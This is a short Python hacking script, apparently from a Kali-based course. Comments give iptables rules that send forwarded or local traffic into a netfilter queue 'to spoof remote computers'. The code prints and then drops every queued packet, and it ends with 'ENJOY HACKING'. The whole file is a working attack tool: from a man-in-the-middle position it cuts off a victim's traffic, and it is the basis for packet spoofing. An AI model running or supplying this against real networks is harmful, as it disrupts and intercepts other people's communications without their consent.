#!/usr/bin/env python
# iptables -I FORWARD -j NFQUEUE --queue-num 0  - Execute in terminal before to spoof remote computers

# iptables -I INPUT -j NFQUEUE --queue-num 0  - Execute in terminal before to spoof localhost(OUR KALI) Computer
# iptables -I OUTPUT -j NFQUEUE --queue-num 0  - Execute in terminal before to spoof localhost(OUR KALI) Computer

# iptables --flush - To delete the created iptables

import netfilterqueue

def process_packet(packet):
    print(packet)
    # packet.accept()
    packet.drop()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

print("-------ENJOY HACKING---------")


